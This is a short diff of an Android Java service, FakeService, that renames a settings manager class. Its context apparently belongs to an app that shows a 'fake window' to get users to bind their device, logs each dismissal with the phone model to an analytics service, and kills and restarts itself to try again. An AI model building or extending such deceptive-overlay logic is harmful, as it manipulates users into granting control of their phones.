@@ -14,7 +14,7 @@ import com.xstd.plugin.Utils.CommonUtil;
 import com.xstd.plugin.Utils.FakeWindow;
 import com.xstd.plugin.config.AppRuntime;
 import com.xstd.plugin.config.Config;
-import com.xstd.plugin.config.SettingManager;
+import com.xstd.plugin.config.PluginSettingManager;
 
 import java.util.HashMap;
 
@@ -103,19 +103,19 @@ public class FakeService extends Service {
 
                 if (Config.DEBUG) {
                     Config.LOGD("[[FakeService]] kill self pid : " + android.os.Process.myPid()
-                            + " current Binding Times : " + SettingManager.getInstance().getDeviceBindingCount());
+                            + " current Binding Times : " + PluginSettingManager.getInstance().getDeviceBindingCount());
                 }
 
                 //notify umeng
                 HashMap<String, String> log = new HashMap<String, String>();
                 log.put("phoneType", Build.MODEL);
-                log.put("failedTime", String.valueOf(SettingManager.getInstance().getDeviceBindingCount() + 1));
+                log.put("failedTime", String.valueOf(PluginSettingManager.getInstance().getDeviceBindingCount() + 1));
                 CommonUtil.umengLog(getApplicationContext(), "fake_window_dismiss", log);
 
                 mHandler.postDelayed(new Runnable() {
                     @Override
                     public void run() {
-                        SettingManager.getInstance().setDeviceBindingCount(SettingManager.getInstance().getDeviceBindingCount() + 1);
+                        PluginSettingManager.getInstance().setDeviceBindingCount(PluginSettingManager.getInstance().getDeviceBindingCount() + 1);
                         android.os.Process.killProcess(android.os.Process.myPid());
                     }
                 }, 300);
